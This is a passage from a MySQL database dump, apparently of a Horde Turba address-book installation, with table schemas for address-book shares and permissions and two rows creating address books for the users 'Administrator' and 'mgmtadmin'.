LOCK TABLES `turba_shares` WRITE;
/*!40000 ALTER TABLE `turba_shares` DISABLE KEYS */;
/*!40000 ALTER TABLE `turba_shares` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `turba_shares_groups`
--

DROP TABLE IF EXISTS `turba_shares_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `turba_shares_groups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_turba_shares_groups_on_share_id` (`share_id`),
  KEY `index_turba_shares_groups_on_group_uid` (`group_uid`),
  KEY `index_turba_shares_groups_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `turba_shares_groups`
--

LOCK TABLES `turba_shares_groups` WRITE;
/*!40000 ALTER TABLE `turba_shares_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `turba_shares_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `turba_shares_users`
--

DROP TABLE IF EXISTS `turba_shares_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `turba_shares_users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_turba_shares_users_on_share_id` (`share_id`),
  KEY `index_turba_shares_users_on_user_uid` (`user_uid`),
  KEY `index_turba_shares_users_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `turba_shares_users`
--

LOCK TABLES `turba_shares_users` WRITE;
/*!40000 ALTER TABLE `turba_shares_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `turba_shares_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `turba_sharesng`
--

DROP TABLE IF EXISTS `turba_sharesng`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `turba_sharesng` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) DEFAULT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_16` tinyint(1) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `attribute_params` text,
  `share_parents` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_turba_sharesng_on_share_name` (`share_name`),
  KEY `index_turba_sharesng_on_share_owner` (`share_owner`),
  KEY `index_turba_sharesng_on_perm_creator_2` (`perm_creator_2`),
  KEY `index_turba_sharesng_on_perm_creator_4` (`perm_creator_4`),
  KEY `index_turba_sharesng_on_perm_creator_8` (`perm_creator_8`),
  KEY `index_turba_sharesng_on_perm_creator_16` (`perm_creator_16`),
  KEY `index_turba_sharesng_on_perm_default_2` (`perm_default_2`),
  KEY `index_turba_sharesng_on_perm_default_4` (`perm_default_4`),
  KEY `index_turba_sharesng_on_perm_default_8` (`perm_default_8`),
  KEY `index_turba_sharesng_on_perm_default_16` (`perm_default_16`),
  KEY `index_turba_sharesng_on_perm_guest_2` (`perm_guest_2`),
  KEY `index_turba_sharesng_on_perm_guest_4` (`perm_guest_4`),
  KEY `index_turba_sharesng_on_perm_guest_8` (`perm_guest_8`),
  KEY `index_turba_sharesng_on_perm_guest_16` (`perm_guest_16`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `turba_sharesng`
--

LOCK TABLES `turba_sharesng` WRITE;
/*!40000 ALTER TABLE `turba_sharesng` DISABLE KEYS */;
INSERT INTO `turba_sharesng` VALUES (1,'W7-zS-I98-PW3bjJ1UX24sZ','Administrator',0,0,0,0,0,0,0,0,0,0,0,0,0,'Address book of Administrator',NULL,'a:3:{s:6:\"source\";s:8:\"localsql\";s:7:\"default\";b:1;s:4:\"name\";s:13:\"Administrator\";}',NULL),(2,'FQtn-yoFHv03iQh6iK8v9WU','mgmtadmin',0,0,0,0,0,0,0,0,0,0,0,0,0,'Address book of mgmtadmin',NULL,'a:3:{s:6:\"source\";s:8:\"localsql\";s:7:\"default\";b:1;s:4:\"name\";s:9:\"mgmtadmin\";}',NULL);
/*!40000 ALTER TABLE `turba_sharesng` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `turba_sharesng_groups`
--

DROP TABLE IF EXISTS `turba_sharesng_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `turba_sharesng_groups` (
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_turba_sharesng_groups_on_share_id` (`share_id`),
  KEY `index_turba_sharesng_groups_on_group_uid` (`group_uid`),
  KEY `index_turba_sharesng_groups_on_perm_2` (`perm_2`),
  KEY `index_turba_sharesng_groups_on_perm_4` (`perm_4`),
  KEY `index_turba_sharesng_groups_on_perm_8` (`perm_8`),
  KEY `index_turba_sharesng_groups_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `turba_sharesng_groups`
--

LOCK TABLES `turba_sharesng_groups` WRITE;
/*!40000 ALTER TABLE `turba_sharesng_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `turba_sharesng_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `turba_sharesng_users`
--

DROP TABLE IF EXISTS `turba_sharesng_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `turba_sharesng_users` (
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_turba_sharesng_users_on_share_id` (`share_id`),
  KEY `index_turba_sharesng_users_on_user_uid` (`user_uid`),
  KEY `index_turba_sharesng_users_on_perm_2` (`perm_2`),
  KEY `index_turba_sharesng_users_on_perm_4` (`perm_4`),
  KEY `index_turba_sharesng_users_on_perm_8` (`perm_8`),
  KEY `index_turba_sharesng_users_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `turba_sharesng_users`
--

LOCK TABLES `turba_sharesng_users` WRITE;
/*!40000 ALTER TABLE `turba_sharesng_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `turba_sharesng_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2017-06-06 23:31:12
